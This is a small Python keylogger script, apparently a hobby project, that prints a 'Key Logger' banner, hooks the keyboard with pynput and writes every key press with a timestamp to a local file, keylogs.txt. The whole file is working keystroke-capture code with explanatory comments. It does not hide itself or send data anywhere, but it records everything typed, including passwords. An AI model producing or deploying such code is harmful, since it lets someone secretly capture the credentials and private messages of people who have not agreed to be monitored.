from pynput.keyboard import Key, Listener
import logging
# pynput.keyboard is used to capture keyboard events, and logging is used to log the events.

logo='''
 _  __            _                                
| |/ /___ _   _  | |    ___   __ _  __ _  ___ _ __ 
| ' // _ \ | | | | |   / _ \ / _` |/ _` |/ _ \ '__|
| . \  __/ |_| | | |__| (_) | (_| | (_| |  __/ |   
|_|\_\___|\__, | |_____\___/ \__, |\__, |\___|_|   
          |___/              |___/ |___/           
v0.0.1 by Youssef | dark-lime-0           
'''
print(logo)

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
# The log messages include the timestamp and the actual key pressed.

def on_press(key):
    logging.info(str(key))
# Defines a function on_press that is called when a key is pressed. It logs the pressed key using the configured logging.

with Listener(on_press=on_press) as listener:
    listener.join()
# Sets up a keyboard listener using pynput. The on_press function is specified as the callback for key presses.
# The listener.join() line ensures that the listener runs in the background until the program is interrupted.
